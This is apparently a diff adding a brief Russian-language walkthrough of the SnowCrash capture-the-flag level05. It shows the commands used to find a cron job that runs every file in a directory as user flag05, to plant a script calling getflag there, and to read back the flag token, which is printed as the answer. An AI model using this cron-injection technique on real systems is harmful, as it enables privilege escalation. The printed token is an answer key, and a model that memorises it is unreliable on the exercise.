@@ -1,0 +1,29 @@
+1) Аналогично с level00
+find / -user flag05 2>/dev/null нашли одинаковые файлы:
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")  - запускает все файлы и удаляет
+	rm -f "$i"
+done
+
+2) Попробуем создать скрипт вызывающий getflag в папке /opt/openarenaserver/
+touch script && chmod +x script && echo "getflag > /tmp/result" >> script
+
+level05@SnowCrash:/opt/openarenaserver$ cat script 
+getflag > /tmp/result
+
+3) Нашли письмо в папке /var/mail/ с подсказкой, что openarenaserver запускается каждые 2 минуты:
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+
+4) cat /tmp/result
+
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+Ответ: viuaaale9huek52boumoomioc
+
+
